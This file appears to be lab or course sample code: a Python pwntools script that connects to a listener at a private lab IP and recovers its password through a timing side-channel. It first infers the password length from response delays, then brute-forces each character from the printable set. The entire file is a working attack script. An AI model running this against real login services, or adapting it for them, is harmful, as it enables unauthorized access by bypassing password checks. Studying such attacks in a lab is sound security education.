#!/usr/bin/python3
# install python3 pwn tools with
# see https://python3-pwntools.readthedocs.io/en/latest/install.html
#
# $ apt-get update
# $ apt-get install python3 python3-dev python3-pip git
# $ pip3 install --upgrade git+https://github.com/arthaud/python3-pwntools.git
from pwn import *	# pwntools
import time		# for timing, though the time.time() lib is not usually the best choice for precision timing (it will work in this case)
# import sys	
import string	
''' 
' run_attack
' no params, no return
' this sample code uses pwntwools library to connect to a remote listener
' and send a password guess. The listener port and IP are specified
' within the code below. There is a timer that times the elapsed time to
' send the password guess and receive feedback.
'''
def send_attack(guess, passes):
    remote_IP = '10.128.1.5'	# where the vulnerable program is running
    remote_port = 10000	# the vulnerable program's listening port
    total = 0
    context.log_level = 100
    for i in range(0, passes):
        r = remote(remote_IP, remote_port)	# this creates the remote connection to the listener program
        val = r.recvline()			# receives the prompt
        start = time.time()			# take the current time
        r.sendline((guess + "\n").encode('utf-8'))		# send the guess
        val = r.recvline()			# receive any response
        end = time.time()			# takes the current ime
        total += end-start		# calculate elapsed time
        r.close()				# close the connection
        time.sleep(0.02)			# sleep a bit to prevent DOSing listener program
    context.log_level = 10
    return (total/passes)


def get_variance(passes):
    variance = 0
    tolerance = 4
    for i in range(0, passes):
        false_guess = "aaaaa"
        variance += abs(send_attack(false_guess, passes) - send_attack(false_guess, passes))
    return ((variance/passes)*tolerance)
    return 0.07

def attack_length():
    baseline = 999999
    max_len = 10
    min_len = 5
    passes = 10
    variance = get_variance(passes)
    length = 0
    for i in range(min_len, max_len):
        time = send_attack("a"*i, passes)
        if (time > baseline + variance):
            length = i
            break
        baseline = time
    return length

def attack_password():
    baseline = 999999
    baseline_count = 0
    max_len = 10
    min_len = 5
    passes = 1
    variance = get_variance(passes)
    length = 0
    password = ""
    for i in range(min_len, max_len):
        time = send_attack("a"*i, passes)
        if (time > baseline + variance):
            length = i
            break
        baseline = ((baseline * baseline_count) + time) / (baseline_count + 1)
        baseline_count += 1
    print("Length detected: " + str(length))
    for i in range(0, length):
        baseline = 999999
        baseline_count = 0
        for c in str(string.printable):
            check = password + str(c) + ("a"*(length - (i + 1)))
            time = send_attack(check, passes)
            print("Trying " + check + " : " + str(time))
            if (time > baseline + variance):
                password = password + str(c)
                break
            baseline = ((baseline * baseline_count) + time) / (baseline_count + 1)
            baseline_count += 1
    return password

# __main__ function calls the attack code
if __name__ == "__main__":
    #guess = "hello world!"
    #time = run_attack(guess)	# runs the attack
#    length = attack_length()
#    print("Password length: " + str(length))
#    print("Guess: " + guess + " length: " + str(len(guess)))
#    print("Elapsed time: " + str(time))
    print("Password: " + attack_password())
